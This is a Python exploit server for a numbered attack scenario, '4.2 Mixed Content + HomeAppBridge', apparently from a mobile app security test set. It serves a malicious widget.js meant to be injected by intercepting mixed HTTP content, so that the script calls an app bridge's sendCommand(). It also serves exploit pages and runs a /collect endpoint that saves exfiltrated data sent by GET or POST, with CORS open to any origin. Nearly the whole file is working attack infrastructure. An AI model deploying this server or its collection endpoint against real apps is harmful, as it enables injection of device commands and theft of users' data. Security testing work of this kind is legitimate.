"""
4.2 Insecure Network Content Trust - Mixed Content + HomeAppBridge EXP Server
Attack: MIXED_CONTENT_ALWAYS_ALLOW allows HTTP scripts in HTTPS pages.
Attacker MITMs HTTP script to call HomeAppBridge.sendCommand().

No deeplink - this sample relies on mixed content injection within legitimate pages.
The server serves the malicious widget.js for MITM injection.
"""
import http.server, json, urllib.parse, os

PORT = 8000
COLLECT_DIR = os.path.join(os.path.dirname(__file__), "received")
os.makedirs(COLLECT_DIR, exist_ok=True)


class ExploitHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)

        # Serve the malicious "widget.js" for mixed content injection
        if parsed.path == "/integrations/widget.js":
            js_path = os.path.join(os.path.dirname(__file__), "exp", "widget.js")
            if os.path.exists(js_path):
                self.send_response(200)
                self.send_header("Content-Type", "application/javascript")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                with open(js_path, "rb") as f:
                    self.wfile.write(f.read())
                return
            self.send_error(404)
            return

        # Serve exploit pages
        if parsed.path.startswith("/exp/"):
            exp_dir = os.path.join(os.path.dirname(__file__), "exp")
            file_path = os.path.join(exp_dir, os.path.basename(parsed.path))
            if os.path.exists(file_path):
                ct = "text/html"
                if file_path.endswith(".js"):
                    ct = "application/javascript"
                self.send_response(200)
                self.send_header("Content-Type", ct)
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                with open(file_path, "rb") as f:
                    self.wfile.write(f.read())
                return
            self.send_error(404)
            return

        # Data collection endpoint
        if parsed.path == "/collect":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            q = urllib.parse.parse_qs(parsed.query)
            d = q.get("d", [""])[0]
            ts = str(int(os.times().elapsed * 1000))
            with open(os.path.join(COLLECT_DIR, f"collected_{ts}.txt"), "w") as f:
                f.write(d)
            print(f"[+] GET collected: {d[:100]}")
            self.wfile.write(json.dumps({"status": "ok"}).encode())
            return

        super().do_GET()

    def do_POST(self):
        cl = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(cl) if cl > 0 else b""
        if self.path == "/collect":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            ts = str(int(os.times().elapsed * 1000))
            with open(os.path.join(COLLECT_DIR, f"collected_{ts}.txt"), "wb") as f:
                f.write(body)
            print(f"[+] POST collected: {body[:100]}")
            self.wfile.write(json.dumps({"status": "ok"}).encode())
            return
        self.send_error(405)

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "*")
        self.end_headers()

    def log_message(self, fmt, *args):
        print(f"[{self.client_address[0]}] {fmt % args}")


if __name__ == "__main__":
    print(f"[*] 4.2 Mixed Content + HomeAppBridge EXP server on :{PORT}")
    print(f"[*] Malicious widget.js: http://localhost:{PORT}/integrations/widget.js")
    print(f"[*] Collection endpoint: http://localhost:{PORT}/collect")
    print(f"[*] Note: No deeplink. Attack via MITM of mixed HTTP content in HTTPS page.")
    print()

    httpd = http.server.HTTPServer(("0.0.0.0", PORT), ExploitHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        httpd.shutdown()
